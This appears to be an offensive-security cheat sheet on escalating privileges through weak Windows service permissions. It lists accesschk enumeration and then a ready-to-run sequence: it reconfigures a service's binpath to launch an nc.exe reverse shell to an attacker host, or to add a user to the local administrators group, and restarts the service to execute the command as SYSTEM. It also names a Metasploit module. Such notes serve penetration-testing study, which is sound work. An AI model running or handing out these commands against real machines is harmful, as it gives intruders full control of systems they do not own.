# Weak Service Permissions

## Check vulnerable services
```
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
```
All services that “Authenticated Users” can modify will be listed.<br>
Imagine service VulnService is vulnerable and we have "SERVICE_ALL_ACCESS" access right.<br>
"SERVICE_ALL_ACCESS" means user has full control on service and can modify the properties of the service

## Exploiting

### Check properties of the service 
```
sc qc VulnService
```
"BINARY_PATH_NAME" points to executable file for this service.

### Change binary path name of the service

Upload nc.exe to victim machine
```
sc config VulnService binpath= "C:\nc.exe <ATTACKER-IP> <ATTACKER-PORT> -e C:\WINDOWS\System32\cmd.exe"
sc config VulnService obj=".\LocalSystem" password=""
```

or user add to administrators group
```
sc config VulnService binpath= "net localgroup administrators <username> /add"
```

Check properties of the service again
```
sc qc VulnService
```
Finally, we will listen on the port with nc and restart the service.

### Restart Service
```
sc stop VulnService
sc start VulnService
```
When you try to start service it will return an error. However our command will run as SYSTEM successfully.

## Exploiting Metasploit
```
exploit/windows/local/service_permissions
```

## See also
* [Accesschk](https://docs.microsoft.com/en-us/sysinternals/downloads/accesschk)
